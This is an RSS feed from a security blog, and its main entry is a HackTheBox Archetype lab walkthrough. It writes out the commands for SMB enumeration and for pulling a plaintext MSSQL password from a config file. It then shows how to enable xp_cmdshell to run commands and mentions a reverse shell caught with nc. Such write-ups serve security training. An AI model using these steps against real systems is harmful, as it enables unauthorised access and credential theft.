<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hackthebox on GP Singh</title><link>https://www.greenbladesec.com/tags/hackthebox/</link><description>Recent content in Hackthebox on GP Singh</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sat, 19 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://www.greenbladesec.com/tags/hackthebox/index.xml" rel="self" type="application/rss+xml"/><item><title>CTF Lab</title><link>https://www.greenbladesec.com/projects/ctf-lab/</link><pubDate>Wed, 01 Jan 2025 00:00:00 +0000</pubDate><guid>https://www.greenbladesec.com/projects/ctf-lab/</guid><description>HackTheBox and TryHackMe machine writeups with custom exploit scripts. Commit-on-root discipline: every rooted machine gets a writeup pushed to GitHub.</description></item><item><title>HackTheBox: Archetype Walkthrough</title><link>https://www.greenbladesec.com/blog/htb-archetype/</link><pubDate>Sat, 19 Apr 2025 00:00:00 +0000</pubDate><guid>https://www.greenbladesec.com/blog/htb-archetype/</guid><description>&lt;h2 id="target">Target&lt;/h2>
&lt;p>Archetype — HTB Starting Point, Windows machine.&lt;/p>
&lt;p>IP: &lt;code>10.10.10.27&lt;/code>&lt;/p>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sV -sC -p- 10.10.10.27
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Interesting ports:&lt;/p>
&lt;ul>
&lt;li>&lt;code>445/tcp&lt;/code> — SMB&lt;/li>
&lt;li>&lt;code>1433/tcp&lt;/code> — MSSQL&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>smbclient -N -L //10.10.10.27
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Anonymous access → &lt;code>backups&lt;/code> share → &lt;code>prod.dtsConfig&lt;/code> file.&lt;/p>
&lt;h2 id="credential-extraction">Credential Extraction&lt;/h2>
&lt;p>&lt;code>prod.dtsConfig&lt;/code> contains plaintext MSSQL credentials:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#7ee787">&amp;lt;ConfiguredValue&amp;gt;&lt;/span>Data Source=.;Password=M3g4c0rp321;User ID=ARCHETYPE\sql_svc;...&lt;span style="color:#7ee787">&amp;lt;/ConfiguredValue&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="mssql-to-shell">MSSQL to Shell&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp321@10.10.10.27 -windows-auth
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enable &lt;code>xp_cmdshell&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff7b72">EXEC&lt;/span>&lt;span style="color:#6e7681"> &lt;/span>sp_configure&lt;span style="color:#6e7681"> &lt;/span>&lt;span style="color:#a5d6ff">&amp;#39;show advanced options&amp;#39;&lt;/span>,&lt;span style="color:#6e7681"> &lt;/span>&lt;span style="color:#a5d6ff">1&lt;/span>;&lt;span style="color:#6e7681"> &lt;/span>RECONFIGURE;&lt;span style="color:#6e7681">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6e7681">&lt;/span>&lt;span style="color:#ff7b72">EXEC&lt;/span>&lt;span style="color:#6e7681"> &lt;/span>sp_configure&lt;span style="color:#6e7681"> &lt;/span>&lt;span style="color:#a5d6ff">&amp;#39;xp_cmdshell&amp;#39;&lt;/span>,&lt;span style="color:#6e7681"> &lt;/span>&lt;span style="color:#a5d6ff">1&lt;/span>;&lt;span style="color:#6e7681"> &lt;/span>RECONFIGURE;&lt;span style="color:#6e7681">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6e7681">&lt;/span>&lt;span style="color:#ff7b72">EXEC&lt;/span>&lt;span style="color:#6e7681"> &lt;/span>xp_cmdshell&lt;span style="color:#6e7681"> &lt;/span>&lt;span style="color:#a5d6ff">&amp;#39;whoami&amp;#39;&lt;/span>;&lt;span style="color:#6e7681">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6e7681">&lt;/span>&lt;span style="color:#8b949e;font-style:italic">-- archetype\sql_svc
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upload reverse shell payload via &lt;code>xp_cmdshell&lt;/code> + SMB share, catch with nc.&lt;/p></description></item></channel></rss>